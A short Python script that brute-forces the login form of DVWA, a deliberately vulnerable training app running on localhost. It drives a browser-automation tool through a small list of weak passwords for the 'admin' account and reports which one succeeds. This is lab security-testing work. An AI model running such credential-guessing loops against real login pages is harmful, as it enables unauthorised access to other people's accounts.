import json
from app.tools.browser import execute_browser_automation

def run_dvwa_bruteforce():
    print("Starting DVWA brute force test...")
    target_url = "http://localhost:8887/login.php"
    
    # Common weak credentials to test
    passwords = ["123456", "admin", "password", "admin123"]
    username = "admin"
    
    for pwd in passwords:
        print(f"[*] Trying {username}:{pwd}")
        
        # We tell the browser tool to:
        # 1. Fill the username
        # 2. Fill the password
        # 3. Click the Login button
        # DVWA login form inputs are typically name='username', name='password', name='Login'
        actions = [
            {"type": "fill", "selector": "input[name='username']", "value": username},
            {"type": "fill", "selector": "input[name='password']", "value": pwd},
            {"type": "click", "selector": "input[name='Login']"} # Often submit name in DVWA
        ]
        
        result_json = execute_browser_automation.invoke({
            "url": target_url, 
            "actions": actions, 
            "extract_html": True,
            "capture_packets": False
        })
        
        result = json.loads(result_json)
        
        if "error" in result:
            print(f"Error connecting: {result['error']}")
            return

        final_url = result.get("final_url", "")
        page_text = result.get("page_text", "")
        
        # In DVWA, a successful login redirects to index.php or similar,
        # or the page text changes to show "Welcome" instead of "Login".
        if "login.php" not in final_url or "Welcome" in page_text:
            print(f"\n[+++] SUCCESS! Valid credentials found:")
            print(f"[+++] URL: {final_url}")
            print(f"[+++] Username: {username} | Password: {pwd}")
            break
        else:
            print("[-] Failed.")

if __name__ == "__main__":
    run_dvwa_bruteforce()